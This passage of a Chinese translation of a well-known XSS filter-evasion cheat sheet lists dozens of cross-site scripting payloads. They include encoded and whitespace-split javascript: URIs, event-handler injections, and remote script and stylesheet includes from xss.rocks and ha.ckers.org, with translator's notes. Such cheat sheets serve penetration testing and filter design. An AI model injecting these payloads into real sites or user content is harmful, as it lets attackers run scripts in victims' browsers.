<h2 id="十六进制且不带分号在html代码中运用"><a href="#十六进制且不带分号在html代码中运用" class="headerlink" title="十六进制且不带分号在html代码中运用"></a>十六进制且不带分号在html代码中运用</h2><p>这也是针对上述字符串$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/$1/进行XSS攻击.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="使用TAB绕过"><a href="#使用TAB绕过" class="headerlink" title="使用TAB绕过"></a>使用TAB绕过</h2><p>用于绕过某些XSS防护.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav   ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="对编码的TAB进行绕过"><a href="#对编码的TAB进行绕过" class="headerlink" title="对编码的TAB进行绕过"></a>对编码的TAB进行绕过</h2><p>使用TAB编码<a href="#_ftn3">[3]</a>这个来分解XSS.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="利用换行符来拆解XSS"><a href="#利用换行符来拆解XSS" class="headerlink" title="利用换行符来拆解XSS"></a>利用换行符来拆解XSS</h2><p>一些人认为09-13(十进制)都可进行此类型攻击,其实非也.其实只有09(tab),10(换行)和13(回车)可以使用.查看ascii表,下面四个示例将展现此payload.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0A;ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="利用回车编码去拆解XSS"><a href="#利用回车编码去拆解XSS" class="headerlink" title="利用回车编码去拆解XSS"></a>利用回车编码去拆解XSS</h2><p>注意:上面用这些字符串比规定的要长,因为0是可以被省略的.通常我们看到的过滤器绕过十六进制和十进制编码是两到三个字符.正确的应该是一到七个字符.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="Null空字符分割javascript指令"><a href="#Null空字符分割javascript指令" class="headerlink" title="Null空字符分割javascript指令"></a>Null空字符分割javascript指令</h2><p>Null空字符也可以作为XSS payload.但是不能像上边那样.你需要直接写入到他们利用工具中例如burp,或者使用%00字在你的url字符串里.在opera的老板(大概7.11 on windows)对于173个char会受到影响.但是null char %00更有用,并帮助我们绕过某些真实的防护,类似示例中:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'print "<span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">java\0script:alert(\</span>"<span class="attr">XSS</span>\")&gt;</span>";' &gt; out</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="利用图像元素中Javascript的空格来绕过"><a href="#利用图像元素中Javascript的空格来绕过" class="headerlink" title="利用图像元素中Javascript的空格来绕过"></a>利用图像元素中Javascript的空格来绕过</h2><p>XSS过滤匹配模式很多情况都没有考虑”Javascript:”中可能有存在空格的情况,因此否则无法渲染.但是这也是导致错误的假设,认为你不可以有引号和”Javascript:”关键字.实际上,你可以从十进制的%01~%32中得到任何字符;<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">" &amp;#14;  javascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="非字母非数字型XSS"><a href="#非字母非数字型XSS" class="headerlink" title="非字母非数字型XSS"></a>非字母非数字型XSS</h2><p>Firefox HTML解析器设定一个在html关键字中非字母非数字都不是有效的.因为这些字符会被视为空格或非有效的HTM标签.问题是一些XSS过滤器假设他们正在匹配关键字然后被空格拆解了.例如”&lt;SCRIPT\s” != “&lt;SCRIPT/XSS\s”:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>/<span class="attr">XSS</span>   <span class="attr">SRC</span>=<span class="string">"http://xss.rocks/xss.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后,基于上述相同想法,使用Ranke fuzzer进行拓展.Gecko渲染引擎允许字母,数字或者HTML封装字符(如引号,尖括号)之外字符位于事件处理和等号之间.从而绕过XSS过滤器.注意这也只是适用于重音符如下所示:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">BODY</span>   <span class="attr">onload</span>!#$%&amp;()*~+<span class="attr">-_.</span>,<span class="attr">:</span>;?@[/|\]^`=<span class="string">alert(</span>"<span class="attr">XSS</span>")&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>根据Yair Amit提醒,IE和Gecko渲染引擎之间略有不同,只允许标签和参数之间没有空格和斜杠.如果系统不允许空格,这示例可能很有用.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>/<span class="attr">SRC</span>=<span class="string">"http://xss.rocks/xss.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="多重尖括号"><a href="#多重尖括号" class="headerlink" title="多重尖括号"></a>多重尖括号</h2><p>由Franz Sedlmaier提交,这个XSS paylod可以通过首先使用匹配”&lt;&gt;”的检测引擎,然后通过比较内部标签,而没有使用更加有效的方式(例如匹配整个字符串尖括号和相关标签).”//”注释在结尾的用于防止Javascrip错误.<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="没有标签绕过"><a href="#没有标签绕过" class="headerlink" title="没有标签绕过"></a>没有标签绕过</h2><p>在Gecko渲染引擎模式下firefox和netscape8.1中,实际上并不需要常规XSSpayload中的”&gt;”部分.firefox会为你非常体贴的安全闭合HTML标签,并且加入闭合标签!这不需要任何额外的HTML.你可以添加引号,如果需要的话.但通常并不是必须的,注意:我不清楚这个代码写入到html代码会闭合成什么样子.<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT   SRC=http://xss.rocks/xss.js?&lt; B &gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="Script标签中协议解析绕过"><a href="#Script标签中协议解析绕过" class="headerlink" title="Script标签中协议解析绕过"></a>Script标签中协议解析绕过</h2><p>这个玩法由Łukasz Pilorz提出来的,并且Ozh’s基于上下文提出协议解析绕过方法.这个XSS payload运行在IE.Netscape在IE和opera渲染模式中,不需要考虑编码问题,因为浏览器在”.j”写法中,会自动识别<script>标签.这种方法非常有效在输入长度受到限制,时候来进行绕过.当然域名越短越好.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">//ha.ckers.org/.j</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure></p>
<h2 id="利用括号半开在HTML-JavaScript-进行XSS"><a href="#利用括号半开在HTML-JavaScript-进行XSS" class="headerlink" title="利用括号半开在HTML/JavaScript 进行XSS"></a>利用括号半开在HTML/JavaScript 进行XSS</h2><p>跟firefox不同,IE渲染引擎不会加入额外的数据在你页面上.但是它允许Javascript利用在<img>标签从而产生XSS payload.因为它不需要一个结束”&gt;”尖括号.你可以插入这个XSS向量在任何HTML标签后面.甚至可以不用”&gt;”来闭合标签.注意:这样确实会搞乱HTML,这取决于他下面的HTML.同时对于这种入侵检测系统(NIDS)正则匹配可以直接绕过,表达式为: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ 因为它不需要”&gt;”结束闭合标签.它也是可以有效对抗真实XSS过滤器,我曾经用这种半开的<iframe>标签代替<img>标签去绕过过滤器.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">"javascript:alert('XSS')"</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="双半开括号”-lt-lt-”绕过"><a href="#双半开括号”-lt-lt-”绕过" class="headerlink" title="双半开括号”&lt;&lt;”绕过"></a>双半开括号”&lt;&lt;”绕过</h2><p>使用一个半开的”&lt;”尖括号在payload结尾处代替”&gt;”进行闭合,会在Netscape和Gecko两个渲染下产生不同效果.firefox正常使用,Netscape就不行;<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">iframe</span> src=http:<span class="comment">//xss.rocks/scriptlet.html   &lt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="利用Javascript转义被转义绕过"><a href="#利用Javascript转义被转义绕过" class="headerlink" title="利用Javascript转义被转义绕过"></a>利用Javascript转义被转义绕过</h2><p>当用户在一个应用程序编辑自定义信息的时候,在常规Javascript代码中是这样,例如: <SCRIPT>var a=”$ENV{QUERY_STRING}”;</script>.如果你想插入你自己的Javascript代码时候,会被服务转义掉其中某些引号,这时你需要通过转义被转义字符来绕过它.从而使最终输入代码类似于<script>var a=”\“;alert(‘XSS’);//“;</script>.最终双引号被服务器转义,并且触发了XSS payload.示例如下:<br><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">";alert('</span>XSS');<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
<p>另外一种方法就是,如果json或者Javascript转义被应用嵌入数据,而不是HTML编码,则Payload如下示例:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'XSS'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="利用标签进行XSS"><a href="#利用标签进行XSS" class="headerlink" title="利用标签进行XSS"></a>利用标签进行XSS</h2><p>这是一个非常easy的XSS payload,可以利用闭合<title>标签,可以封装恶意的XSS攻击.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="actionscript">alert(<span class="string">"XSS"</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></title></p>
<h2 id="利用标签进行XSS-1"><a href="#利用标签进行XSS-1" class="headerlink" title="利用标签进行XSS"></a>利用<input>标签进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT <span class="attribute">TYPE</span>=<span class="string">"IMAGE"</span>   <span class="attribute">SRC</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>译者注:其实还可以利用<input>标签中的hideeen属性来触发,网上已经有详细描述,这里就不叙述了,示例如下:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input   <span class="attribute">type</span>=<span class="string">"hidden"</span> <span class="attribute">name</span>=<span class="string">"returnurl"</span> <span class="attribute">value</span>=<span class="string">"[USER   INJECT]"</span> /&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="利用标签进行XSS-2"><a href="#利用标签进行XSS-2" class="headerlink" title="利用标签进行XSS"></a>利用<body>标签进行XSS</body></h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY   <span class="attribute">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="利用标签的Dynsrc属性进行XSS"><a href="#利用标签的Dynsrc属性进行XSS" class="headerlink" title="利用标签的Dynsrc属性进行XSS"></a>利用<img>标签的Dynsrc属性进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG   <span class="attribute">DYNSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>译者注:不过只在IE和Netscape中支持,Firefox会提示proprietary attribute或者拒绝访问.同时译者在这里说明下,只针对IE6以前,到以后版本就不支持了.望注意(<em>^__^</em>).</p>
<h2 id="利用标签的Lowsrc属性进行XSS"><a href="#利用标签的Lowsrc属性进行XSS" class="headerlink" title="利用标签的Lowsrc属性进行XSS"></a>利用<img>标签的Lowsrc属性进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG   <span class="attribute">LOWSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>基于CSS的List-style-image属性进行XSS</p>
<p>使用图像来替换列表项的标记,此Javascript指令只能在IE下使用,是一个不是特别有用的XSS paylod.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">li</span> &#123;<span class="attribute">list-style-image</span>:   <span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">UL</span>&gt;</span><span class="tag">&lt;<span class="name">LI</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>译者注:由于翻译工作占用大量时间,没有在具体环境下测试此paylod,但是理论上” list-style-image”, 所有浏览器都支持 list-style-image 属性。</p>
<h2 id="利用标签中的VBscript命令进行XSS"><a href="#利用标签中的VBscript命令进行XSS" class="headerlink" title="利用标签中的VBscript命令进行XSS"></a>利用<img>标签中的VBscript命令进行XSS</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG <span class="attribute">SRC</span>=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="利用Livescript命令进行XSS-只适用老版本Netscape"><a href="#利用Livescript命令进行XSS-只适用老版本Netscape" class="headerlink" title="利用Livescript命令进行XSS(只适用老版本Netscape)"></a>利用Livescript命令进行XSS(只适用老版本Netscape)</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG   <span class="attribute">SRC</span>=<span class="string">"livescript:[code]"</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="利用SVG的标签进行XSS"><a href="#利用SVG的标签进行XSS" class="headerlink" title="利用SVG的标签进行XSS"></a>利用SVG的<object>标签进行XSS</object></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="基于ECMAScript-6的XSS"><a href="#基于ECMAScript-6的XSS" class="headerlink" title="基于ECMAScript 6的XSS"></a>基于ECMAScript 6的XSS</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert\x28document.domain\x29`</span><span class="string">``</span></span><br></pre></td></tr></table></figure>
<h2 id="利用标签ONLOAD属性进行XSS"><a href="#利用标签ONLOAD属性进行XSS" class="headerlink" title="利用标签ONLOAD属性进行XSS"></a>利用<body>标签ONLOAD属性进行XSS</body></h2><p>此方法不需要”javascript:”或”&lt;script …”任何编码方式来进行XSS攻击. Dan Crowley另外指出,你可以在等号之前放一个空格(“onload=” != “onload =”):</p>
<p>   &lt;BODY ONLOAD=alert(‘XSS’)&gt;   </p>
<h2 id="基于事件句柄-或称为-事件处理器"><a href="#基于事件句柄-或称为-事件处理器" class="headerlink" title="基于事件句柄(或称为:事件处理器)"></a>基于事件句柄(或称为:事件处理器)</h2><p>它可以用于上述类似XSS攻击(这是在撰写本文时在网络上最全面的列表了).感谢Rene Ledosquet在HTML+TIME上更新,此外你可以参考<a href="http://help.dottoro.com/" target="_blank" rel="noopener">Dottoro Web Reference</a>当然还有一份很好的<a href="http://help.dottoro.com/ljfvvdnm.php" target="_blank" rel="noopener">Javascript事件列表</a>.</p>
<ol>
<li>FSCommand() (攻击者可以使用它当执行一个嵌入的flash对象时)</li>
<li>onAbort() (当用户中止加载图像时)</li>
<li>onActivate() (当对象设置为活动元素时)</li>
<li>onAfterPrint() (在用户打印或预览打印作业后激活)</li>
<li>onAfterUpdate() (在更新源对象中的数据后激活数据对象)</li>
<li>onBeforeActivate() (在将对象设置为活动元素之前触发)</li>
<li>onBeforeCopy() (攻击者在将选择复制到剪贴板之前执行攻击字符串 - 攻击者可以使用 execCommand(“Copy”) 功能执行此操作)</li>
<li>onBeforeCut() (攻击者在选择被切断之前执行攻击字符串)</li>
<li>onBeforeDeactivate() (在从当前对象更改activeElement之后触发)</li>
<li>onBeforeEditFocus() (在可编辑元素中包含的对象进入UI激活状态之前触发，或者当可控制可选容器对象被选择时触发)</li>
<li>onBeforePaste() (用户需要被欺骗粘贴或被强制使用 execCommand(“Paste”) 功能)</li>
<li>onBeforePrint() (用户需要被骗到打印或攻击者可以使用 print() or execCommand(“Print”) 功能).</li>
<li>onBeforeUnload() (用户需要被诱骗关闭浏览器 - 攻击者无法卸载窗口，除非从父级生成.)</li>
<li>onBeforeUpdate() (在更新源对象中的数据之前激活数据对象)</li>
<li>onBegin() (当元素的时间轴开始时，onbegin事件会立即触发)</li>
<li>onBlur() (在另一个弹出窗口加载窗口失去焦点的情况下)</li>
<li>onBounce() (当选框对象的行为属性设置为 “alternate”并且选框的内容到达窗口的一边时触发.)</li>
<li>onCellChange() (数据提供者中数据更改时触发)</li>
<li>onChange() 选择, text,或TEXTAREA字段失去焦点,或其值已被修改)</li>
<li>onClick() (需要人点击表单)</li>
<li>onContextMenu() (用户需要右击攻击区域)</li>
<li>onControlSelect() (当用户即将对对象进行控件选择时触发)</li>
<li>onCopy() (用户需要复制某些东西，或者可以使用 execCommand(“Copy”) 命令利用它)</li>
<li>onCut() (用户需要复制某些东西，或者使用execCommand(“Cut”) 命令可以利用它.)</li>
<li>onDataAvailable() (用户需要更改元素中的数据，或者攻击者可以执行相同的功能)</li>
<li>onDataSetChanged() (由数据源对象公开的数据集更改时触发)</li>
<li>onDataSetComplete() (触发以指示所有数据可从数据源对象获得)</li>
<li>onDblClick() (用户双击表单元素或链接)</li>
<li>onDeactivate() (当activeElement从当前对象更改为父文档中的另一个对象时触发)</li>
<li>onDrag() (要求用户拖动对象)</li>
<li>onDragEnd() (要求用户拖动对象)</li>
<li>onDragLeave() (要求用户将对象拖放到有效的位置)</li>
<li>onDragEnter() (要求用户将对象拖放到有效位置)</li>
<li>onDragOver() (要求用户将对象拖放到有效位置)</li>
<li>onDragDrop() (用户将一个对象（例如文件）放到浏览器窗口上)</li>
<li>onDragStart() (当用户开始拖动操作时发生)</li>
<li>onDrop() (用户将一个对象（例如文件）放到浏览器窗口上)</li>
<li>onEnd() (当时间轴结束时，onEnd事件触发.)</li>
<li>onError() (加载文档或图像会导致错误)</li>
<li>onErrorUpdate() (当更新数据源对象中的关联数据时发生错误时，在数据绑定对象上触发)</li>
<li>onFilterChange() (视觉过滤器完成状态更改时触发)</li>
<li>onFinish() (当选框完成循环时，攻击者可以创建漏洞)</li>
<li>onFocus() (攻击者在窗口获得焦点时执行攻击字符串)</li>
<li>onFocusIn() (当窗口获得焦点时攻击者执行攻击字符串)</li>
<li>onFocusOut() (当窗口失去焦点时攻击者执行攻击字符串)</li>
<li>onHashChange() (当文档的当前地址的片段标识符部分更改时触发)</li>
<li>onHelp() (攻击者在窗口对焦时用户点击F1时执行攻击字符串)</li>
<li>onInput() (元素的文本内容通过用户界面进行更改)</li>
<li>onKeyDown() (用户按下一个键)</li>
<li>onKeyPress() (用户按下或按住一个键)</li>
<li>onKeyUp() (用户释放一个键)</li>
<li>onLayoutComplete() (用户必须打印或打印预览)</li>
<li>onLoad() (攻击者在窗口加载后执行攻击字符串)</li>
<li>onLoseCapture() (可以通过 releaseCapture() 方法利用)</li>
<li>onMediaComplete() (当使用流媒体文件时，该事件可能在文件开始播放之前触发)</li>
<li>onMediaError() (用户在浏览器中打开包含媒体文件的页面，当有问题时触发事件)</li>
<li>onMessage() (当文档收到消息时触发)</li>
<li>onMouseDown() (攻击者需要让用户点击图像)</li>
<li>onMouseEnter() (光标移动一个对象或区域)</li>
<li>onMouseLeave() (攻击者需要让用户将鼠标悬停在图像或表上，然后再次关闭)</li>
<li>onMouseMove() (攻击者需要让用户将鼠标放在图像或表格上)</li>
<li>onMouseOut() (攻击者需要让用户将鼠标移到图像或表上，然后再次关闭)</li>
<li>onMouseOver() (光标移动一个对象或区域)</li>
<li>onMouseUp() (攻击者需要让用户点击图像)</li>
<li>onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)</li>
<li>onMove() (用户或攻击者会移动页面)</li>
<li>onMoveEnd() (用户或攻击者会移动页面)</li>
<li>onMoveStart() (用户或攻击者会移动页面)</li>
<li>onOffline() (如果浏览器工作在在线模式并且它开始脱机工作，则会发生)</li>
<li>onOnline() (如果浏览器处于离线模式并且开始在线工作，则会发生)</li>
<li>onOutOfSync() (中断元素根据时间轴定义的播放媒体的能力)</li>
<li>onPaste() (用户需要粘贴或者攻击者可以使用 execCommand(“Paste”) 功能)</li>
<li>onPause() (当时间线暂停时，包括body元素在内的每个元素处于活动状态时，onpause事件触发)</li>
<li>onPopState() (用户导航会话历史时触发)</li>
<li>onProgress() (攻击者会将此作为Flash影片加载)</li>
<li>onPropertyChange() (用户或攻击者需要更改元素属性)</li>
<li>onReadyStateChange() (用户或攻击者需要更改元素属性)</li>
<li>onRedo() (用户在撤销交易历史中前进)</li>
<li>onRepeat() (事件每次重复一次时间轴，不包括第一个完整周期)</li>
<li>onReset() (用户或攻击者重置表单)</li>
<li>onResize() (用户将调整窗口大小;攻击者可以自动初始化,例如: <script>self.resizeTo(500,400);</script>)</li>
<li>onResizeEnd() (用户将调整窗口大小;攻击者可以自动初始化，例如: <script>self.resizeTo(500,400);</script>)</li>
<li>onResizeStart() (用户可以调整窗口大小;攻击者可以自动初始化，例如: <script>self.resizeTo(500,400);</script>)</li>
<li>onResume() (时间轴恢复时，每个元素上的onresume事件都会触发，包括body元素)</li>
<li>onReverse() (如果元素的repeatCount大于1，则此事件会在时间线开始向后播放时触发)</li>
<li>onRowsEnter() (用户或攻击者需要更改数据源中的一行)</li>
<li>onRowExit() (用户或攻击者需要更改数据源中的一行)</li>
<li>onRowDelete() (用户或攻击者需要删除数据源中的一行)</li>
<li>onRowInserted() (用户或攻击者需要在数据源中插入一行)</li>
<li>onScroll() (用户需要滚动，或者攻击者可以使用scrollBy() 函数)</li>
<li>onSeek() (当时间线设置为在向前方向以外的任何方向播放时，onreverse事件触发)</li>
<li>onSelect() (用户需要选择一些文本 - 攻击者可以自动初始化，如: window.document.execCommand(“SelectAll”);)</li>
<li>onSelectionChange() (用户需要选择一些文本 - 攻击者可以自动初始化，如: window.document.execCommand(“SelectAll”);)</li>
<li>onSelectStart() (用户需要选择一些文本 - 攻击者可以自动初始化，如: window.document.execCommand(“SelectAll”);)</li>
<li>onStart() (在每个选框循环的开始处触发)</li>
<li>onStop() (用户需要按停止按钮或离开网页)</li>
<li>onStorage() (存储区域更改)</li>
<li>onSyncRestored() (用户中断元素根据时间轴定义的播放媒体的能力)</li>
<li>onSubmit() (要求攻击者或用户提交表单)</li>
<li>onTimeError() (用户或攻击者将dur属性设置为无效值)</li>
<li>onTrackChange() (用户或攻击者在播放列表中更改轨道)</li>
<li>onUndo() (用户在撤消事务历史记录中向后退)</li>
<li>onUnload() (当用户点击任何链接或按下后退按钮或攻击者强制点击)</li>
<li>onURLFlip() (当由HTML + TIME（定时互动多媒体扩展）媒体标签播放的高级流格式（ASF）文件处理嵌入在ASF文件中的脚本命令时，该事件触发)</li>
<li>seekSegmentTime() (这是一种在元素段时间线上定位指定点并从该点开始播放的方法，该段由包括使用AUTOREVERSE属性的反向播放的时间线的一个重复组成.)</li>
</ol>
<h2 id="利用-lt-BGSOUND-gt-标签进行XSS"><a href="#利用-lt-BGSOUND-gt-标签进行XSS" class="headerlink" title="利用&lt; BGSOUND &gt;标签进行XSS"></a>利用&lt; BGSOUND &gt;标签进行XSS</h2>   <bgsound src="javascript:alert('XSS');">   

<h2 id="利用-amp-JavaScript-includes方法进行XSS"><a href="#利用-amp-JavaScript-includes方法进行XSS" class="headerlink" title="利用&amp; JavaScript includes方法进行XSS"></a>利用&amp; JavaScript includes方法进行XSS</h2>   <br size="&{alert('XSS')}">   

<h2 id="利用样式表标签进行XSS"><a href="#利用样式表标签进行XSS" class="headerlink" title="利用样式表标签进行XSS"></a>利用样式表<ink>标签进行XSS</ink></h2>   <link rel="stylesheet" href="javascript:alert('XSS');">   

<h2 id="利用远程样式表进行XSS"><a href="#利用远程样式表进行XSS" class="headerlink" title="利用远程样式表进行XSS"></a>利用远程样式表进行XSS</h2><p>(使用像远程样式表这样的东西,你可以利用样式参数作为XSS,可以用嵌入表达式方式来完成XSS攻击).但是它仅仅适用在IE浏览器或者Netscape 8.1+下运行.需要注意页面上没有显示包含Javascript代码.使用这样的远程样式表,至少需要使用body标签,因此除非显示paylod本身的其他内容.如果他是一个空白页面,你需要添加至少一个字母到页面显示,确保payload可以正常工作..</p>
   <link rel="stylesheet" href="http://ha.ckers.org/xss.css">   

<h2 id="利用远程样式表进行XSS-part-2"><a href="#利用远程样式表进行XSS-part-2" class="headerlink" title="利用远程样式表进行XSS part 2"></a>利用远程样式表进行XSS part 2</h2><p>这跟上述原理相同,只不过这里使用的<style>标签来代替<LINK>,稍微变动下被用来攻击GOOGLE Desktop.注意:如果此payload遇到闭合后会出现在htrml上,则可以考虑删除</style>.如果你在XSS脚本攻击中无法使用等号或斜杠,那么可以试试这个:</p>
<p>   <style>@import’<a href="http://xss.rocks/xss.css&#39;">http://xss.rocks/xss.css&#39;</a>;</style>   </p>
<h2 id="利用远程样式表进行XSS-part-3"><a href="#利用远程样式表进行XSS-part-3" class="headerlink" title="利用远程样式表进行XSS part 3"></a>利用远程样式表进行XSS part 3</h2><p>适用于Opera8.0(不支持9.X),根据RFC2616设置链接头,.它不符合HTTP1.1的规范,但是有一些浏览器仍然允许它(如firefox和Opera).这里技巧就是,我设置一个http头(这里与HTTP头没什么区别,例如: <a href="http://xss.rocks/xss.css" target="_blank" rel="noopener">http://xss.rocks/xss.css</a>; REL=stylesheet).这样带远程XSS payload将会运行,但是它并不支持FireFox.</p>
   <meta http-equiv="Link" content="<http://xss.rocks/xss.css>; REL=stylesheet">   

<h2 id="利用远程样式表进行XSS-part-4"><a href="#利用远程样式表进行XSS-part-4" class="headerlink" title="利用远程样式表进行XSS part 4"></a>利用远程样式表进行XSS part 4</h2><p>仅适用于Gecko渲染引擎,并将XUL文件绑定到父页面.个人认为这里是讽刺Netscape,Gecko是更安全的,因此绝大多数网站容易受到这种影响:</p>
   <style>BODY{-moz-binding:url(“<a href="http://xss.rocks/xssmoz.xml#xss&quot;)}">http://xss.rocks/xssmoz.xml#xss&quot;)}</a></style>   

<h2 id="利用标签来分解XSS-payload"><a href="#利用标签来分解XSS-payload" class="headerlink" title="利用标签来分解XSS payload"></a>利用<style>标签来分解XSS payload</h2><p>此payload有时会将IE浏览器中造成无限循环.</p>
<p>   <STYLE>@im\port’\ja\vasc\ript:alert(“XSS”)’;</style>   <p></p>
